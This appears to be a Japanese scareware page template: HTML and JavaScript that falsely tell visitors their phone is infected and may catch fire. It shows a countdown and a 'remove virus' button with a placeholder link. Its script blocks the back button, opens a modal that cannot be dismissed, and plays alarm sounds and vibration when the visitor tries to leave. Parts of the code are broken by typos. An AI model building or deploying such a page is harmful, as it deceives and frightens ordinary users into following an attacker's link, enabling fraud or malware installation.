<!DOCTYPE html>

<html>
<head>
    <meta charset="utf-8">
    <title>【警告】ウイルスが発見しました</title>
    <!-- Compiled and minified CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
</head>
<body class="red darken-3 white-text">
<div class="container">
 <h1><img src="icon.png" alt="" style="width:20%; vertical-align:middle; margin-right: 20px;">警告</h1>
    <h4>あなたの<span id="device"></span>からウイルスが発見されました</h4>
    <p class="flow-text">このままではスマートフォンが発火もしくは破損する可能性があります。</p>
    <p class="flow-text"><span id="timer"style="font-size:2em;"></span>秒以内に以下のリンクから対処してください。</p>
    <a  class="btn btn-large" href="ここにURL">ウイルスを除去する</a>
    <div id="alert" class="modal">
       <div class="modal-content black-text">
       <h4>警告</h4>
       <p>お使いの端末からウイルスが発見されました。次のページからウイルスを除去してください。</p>
       </div>
       <div "modal-footer">
       <button id="close" class="btn btn-large">OK</button>
       </div>
    </div>
</div>
    <!-- Compiled and minified JavaScript -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
<script src="myscript.js">function play_se(){
var warning = new Audio('warning.mp3');
var voice = new Audio('voice.mp3')
warning.play();
voice.play();
navigator.vibrate([200,100,200,100,200,100,200])
}


$(function(){
//ページ読み込みが完了すると実行


//ブラウザバック禁止
history.pushState(null,null,null);
$(window).on('popstate',function(e){
if(!e.orininalEvent.state){
play_se();
history.pushState(null,null,null);
returu;
}
});


//モーダル表示
$('.modal').modal({dismissible: false});
$('#alert').modal('open');
$('#close').click(function(){
$('#alert').modal('close');
play_se();
});


//端末情報取得
var device = navigator.userAgent.match(/Android|iPhone|ipad/);
if(device == null){
  device = '端末';
}
$('#device').text(device);


//カウントダウン処理
var time = 200;
setInterval(function(){
time--;
$('#timer').text(time);
},1000);
});</script>
</body>
</html>
